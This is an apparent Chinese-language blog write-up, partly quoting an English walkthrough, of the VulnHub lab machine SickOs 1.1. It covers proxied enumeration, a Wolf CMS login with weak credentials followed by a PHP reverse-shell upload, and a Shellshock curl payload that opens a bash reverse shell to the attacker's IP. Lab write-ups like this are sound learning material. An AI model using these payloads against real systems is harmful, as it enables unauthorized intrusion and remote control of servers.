@@ -1,0 +1,558 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>SickOs：1.1 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SickOs：1.1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-10 00:00" pubdate>
+        2022年7月10日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      52
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SickOs：1.1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x0C-SickOs-1-1-vulnhub"><a href="#0x0C-SickOs-1-1-vulnhub" class="headerlink" title="0x0C SickOs: 1.1~vulnhub"></a>0x0C SickOs: 1.1~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.157</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 22:57 EDT<br>Nmap scan report for 192.168.135.2 (192.168.135.2)<br>Host is up (0.0015s latency).<br>Nmap scan report for 192.168.135.141 (192.168.135.141)<br>Host is up (0.010s latency).<br>Nmap done: 256 IP addresses (2 hosts up) scanned in 7.13 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo arp-scan -l</span><br>[sudo] password for kali: <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:38:c2:06, IPv4: 192.168.135.141<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.135.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.135.2   00:50:56:eb:65:60       VMware, Inc.<br>192.168.135.157 00:0c:29:2b:9b:36       VMware, Inc.<br>192.168.135.254 00:50:56:ea:f7:2c       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned in 2.174 seconds (117.76 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.157</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.157</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 23:01 EDT<br>Nmap scan report for 192.168.135.157 (192.168.135.157)<br>Host is up (0.0042s latency).<br>Not shown: 65532 filtered ports<br>PORT     STATE  SERVICE    VERSION<br>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)<br>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)<br>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)<br>3128/tcp open   http-proxy Squid http proxy 3.1.19<br>|_http-server-header: squid/3.1.19<br>|_http-title: ERROR: The requested URL could not be retrieved<br>8080/tcp closed http-proxy<br>MAC Address: 00:0C:29:2B:9B:36 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>3128/tcp</td>
+<td>open</td>
+<td>http-proxy</td>
+<td>Squid http proxy 3.1.19</td>
+</tr>
+<tr>
+<td>8080/tcp</td>
+<td>closed</td>
+<td>http-proxy</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>3128端口</strong></p>
+<p>通过 Nmap 扫到的端口信息可知，3128 端口开放了一个代理服务，直接访问是访问不了靶机的 80 端口的，可以借助它的代理来访问，设置浏览器代理，进行访问 <code>http://192.168.135.157</code> ，得到：BLEHHH!!! </p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.157 -p http://192.168.135.157:3128</span>                                                 <br>-----------------<br>URL_BASE: http://192.168.135.157/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>PROXY: http://192.168.135.157:3128<br>-----------------                                                        <br><br>---- Scanning URL: http://192.168.135.157/ ----<br>+ http://192.168.135.157/cgi-bin/ (CODE:403|SIZE:291)<br>+ http://192.168.135.157/connect (CODE:200|SIZE:109)<br>+ http://192.168.135.157/index (CODE:200|SIZE:21)<br>+ http://192.168.135.157/index.php (CODE:200|SIZE:21)<br>+ http://192.168.135.157/robots (CODE:200|SIZE:45)<br>+ http://192.168.135.157/robots.txt (CODE:200|SIZE:45)<br>+ http://192.168.135.157/server-status (CODE:403|SIZE:296)<br></code></pre></td></tr></table></figure>
+<p>发现 robots.txt，访问 <code>http://192.168.135.157/robots.txt</code> ：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<br><span class="hljs-attribute">Dissalow</span><span class="hljs-punctuation">: </span>/wolfcms<br></code></pre></td></tr></table></figure>
+<p>发现 wolfcms 页面，访问 <code>http://192.168.135.157/wolfcms/</code> ，发现是个 CMS ，查询可知，wolfcms 有后台文件上传漏洞</p>
+<p>使用其他工具进行扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.157/wolfcms/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --random-agent   --proxy   http://192.168.135.157:3128</span><br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.135.157/wolfcms/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] Proxy:                   http://192.168.135.157:3128<br>[+] User Agent:              Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16<br>[+] Timeout:                 10s<br>===============================================================<br>2022/07/10 04:33:24 Starting gobuster in directory enumeration mode<br>===============================================================<br>/docs                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/docs/]<br>/public               (Status: 301) [Size: 327] [--&gt; http://192.168.135.157/wolfcms/public/]<br>/config               (Status: 200) [Size: 0]                                               <br>/favicon              (Status: 200) [Size: 894]                                             <br>/robots               (Status: 200) [Size: 0]                                               <br>/index                (Status: 200) [Size: 3975]                                            <br>/wolf                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/wolf/]  <br>/composer             (Status: 200) [Size: 403]                                             <br>                                                                                            <br>===============================================================<br>2022/07/10 04:34:35 Finished<br>===============================================================<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.157 --proxy http://192.168.135.157:3128</span>     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.157/_22-07-10_05-01-37.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_05-01-37.log<br>Target: http://192.168.135.157/<br><br>[05:01:37] Starting: <br>[05:01:59] 403 -  291B  - /cgi-bin/                                         <br>[05:02:03] 403 -  302B  - /doc/en/changes.html                              <br>[05:02:03] 403 -  302B  - /doc/html/index.html                              <br>[05:02:03] 403 -  287B  - /doc/<br>[05:02:03] 403 -  301B  - /doc/stable.version<br>[05:02:03] 403 -  291B  - /doc/api/<br>[05:02:09] 200 -   21B  - /index                                            <br>[05:02:09] 200 -   21B  - /index.php                                                                        <br>[05:02:23] 200 -   45B  - /robots.txt                                       <br>[05:02:24] 403 -  297B  - /server-status/                                   <br>[05:02:24] 403 -  296B  - /server-status<br>                                                                             <br>Task Completed   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.157 -useproxy http://192.168.135.157:3128</span><br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.157<br>+ Target Hostname:    192.168.135.157<br>+ Target Port:        80<br>+ Proxy:              192.168.135.157:3128<br>+ Start Time:         2022-07-10 04:56:36 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.2.22 (Ubuntu)<br>+ Retrieved via header: 1.0 localhost (squid/3.1.19)<br>+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>+ Uncommon header &#x27;x-cache&#x27; found, with contents: MISS from localhost<br>+ Uncommon header &#x27;x-cache-lookup&#x27; found, with contents: MISS from localhost:3128<br>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015<br>+ Uncommon header &#x27;tcn&#x27; found, with contents: list<br>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#x27;index&#x27; were found: index.php<br>+ Server banner has changed from &#x27;Apache/2.2.22 (Ubuntu)&#x27; to &#x27;squid/3.1.19&#x27; which may suggest a WAF, load balancer or proxy is in place<br>+ Uncommon header &#x27;x-squid-error&#x27; found, with contents: ERR_INVALID_REQ 0<br>+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br>+ Uncommon header &#x27;93e4r0-cve-2014-6271&#x27; found, with contents: true<br>+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the &#x27;shellshock&#x27; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).<br>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br>+ 8726 requests: 0 error(s) and 15 item(s) reported on remote host<br>+ End Time:           2022-07-10 04:57:14 (GMT-4) (38 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>
+<p>nikto 扫描出一个 shellshock 漏洞</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="1、Upload-file"><a href="#1、Upload-file" class="headerlink" title="1、Upload file"></a>1、Upload file</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yujin2020/p/14187067.html">Wolf CMS后台文件上传getshell并提权 - 誉津 - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<p>访问 <code>http://192.168.135.157/wolfcms/docs/updating</code> ，得到 wolfcms 版本：0.8.2</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Wolf CMS - INFORMATION ABOUT UPDATING</span><br><br><span class="hljs-comment">## GENERAL ##</span><br>Please be aware that we only support single <span class="hljs-built_in">version</span> upgrades.<br>IMPORTANT - always check your security <span class="hljs-keyword">by</span> viewing security.php <span class="hljs-built_in">post</span> update!<br><br><span class="hljs-comment">### Upgrading from 0.8.1 =&gt; 0.8.2 ###</span><br>SECURITY UPDATE - This release <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-literal">one</span>-<span class="hljs-built_in">file</span> security patch.<br>There are no database changes <span class="hljs-keyword">in</span> this release <span class="hljs-keyword">and</span> only <span class="hljs-literal">one</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> code changes,<br>so you can upgrade <span class="hljs-keyword">by</span> simply replacing wolf/plugins/archive/archive.php <span class="hljs-keyword">and</span> index.php.<br>Index.php needs replacing only because <span class="hljs-keyword">it</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> updated <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span>, either<br><span class="hljs-built_in">replace</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> update <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure>
+<p>此版本存在后台文件上传，访问 <code>http://192.168.135.157/wolfcms/?/admin/login</code> ，进入后台登录界面</p>
+<p>尝试弱口令 <code>admin:admin</code> 登录，成功登陆，在 <code>Files</code> 下发现可以上传文件，上传反弹 shell ，kali 监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.157/wolfcms/public/php-reverse-shell.php</code> ，成功反弹：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 50480<br>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 11:11:51 up  2:45,  0 users,  load average: 54.24, 52.71, 36.84<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
+<h3 id="2、Shellshock"><a href="#2、Shellshock" class="headerlink" title="2、Shellshock"></a>2、Shellshock</h3><blockquote>
+<p> <a target="_blank" rel="noopener" href="https://jhalon.github.io/vulnhub-sick-os1/">https://jhalon.github.io/vulnhub-sick-os1/</a></p>
+</blockquote>
+<p>It seems that wolfcms is a blog. I thoroughly reviewed the content to see if there wasn’t anything of value. Unfortunately, there wasn’t - so I decided to take advantage of the Shellshock vulnerability and attempt a <a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse tcp shell</a> on the server.</p>
+<p>First things first, we have to set up a netcat listener.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# nc -lnvp 1234<br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure>
+<p>Now before we exploit Shellshock, we need to understand what the vulnerability is, and how it works. So let me explain before we begin exploiting it.</p>
+<p>Shellshock - <a target="_blank" rel="noopener" href="http://www.cvedetails.com/cve/cve-2014-6271">CVE-2014-6271</a> and <a target="_blank" rel="noopener" href="http://www.cvedetails.com/cve/cve-2014-6278">CVE-2014-6278</a> - was a serious vulnerability found in the Bash command shell, which is commonly used in Linux distributions. The vulnerability allowed attackers to run arbitrary commands on an affected system. The most commonly affected webs server where the ones using the <a target="_blank" rel="noopener" href="http://www.cgi101.com/book/ch3/text.html">CGI Environment</a>.</p>
+<p>In general - Bash allows the exporting of shell function to other bash instances on the server. It is done by creating an environmental variable with the function definition as such…</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">ENV_VAR_FN</span>=’() &#123; &lt;your function&gt; &#125;;’<br></code></pre></td></tr></table></figure>
+<p>The <strong>ENV_VAR_FN</strong> is the function that is executed in the bash instance. Unfortunately, there was a bug in the implementation of this to where the function continued to read and execute beyond the function definition - allowing to run additional code. Technically it should have stopped reading past the function definition, marked with a <code>;</code>.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">env ENV_VAR_FN=’() &#123; <span class="hljs-tag">&lt;<span class="hljs-name">your</span> <span class="hljs-attr">function</span>&gt;</span> &#125;; <span class="hljs-tag">&lt;<span class="hljs-name">attacker</span> <span class="hljs-attr">code</span> <span class="hljs-attr">here</span>&gt;</span>’<br></code></pre></td></tr></table></figure>
+<p>Many services were affected by this bug. Any web server that consumed user input and added the input to the bash environment, was vulnerable. A possible exploit in the CGI Environment would look like this.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/&lt;server path&gt; HTTP/</span><span class="hljs-number">1.1</span><br><br>User-agent: () &#123; :;&#125;; echo something&gt;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>new_file<br></code></pre></td></tr></table></figure>
+<p>This command would create a file called <strong>new_file</strong>, which an attacker could use to their advantage. So, since we now know that <strong>cgi-bin/status</strong> is exploitable, and we know “how” to exploit it, let go ahead and do so!</p>
+<p>We will be leveraging the <a target="_blank" rel="noopener" href="https://curl.haxx.se/docs/manpage.html">cURL</a> command for this vulnerability. This way we can send edited User-Agent header information that will be accepted by the CGI’s Bash environment.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# curl -x http://192.168.135.157:3128 -H &quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.135.141/1234 0&gt;&amp;1&quot; http://192.168.135.157/cgi-bin/status<br></code></pre></td></tr></table></figure>
+<p>What I did there was use the <strong>-x</strong> switch to initiate a connection using our HTTP Proxy, and then used the <strong>-H</strong> switch to include a edited User-Agent header. The code I executed was a reverse tcp bash shell. If done correctly, we should have gotten a reverse shell through netcat!</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 41481<br>bash: no job control in this shell<br>www-data@SickOs:/usr/lib/cgi-bin$ whoami<br>whoami<br>www-data<br></code></pre></td></tr></table></figure>
+<p>也可以直接使用脚本，searchsploit 查找：</p>
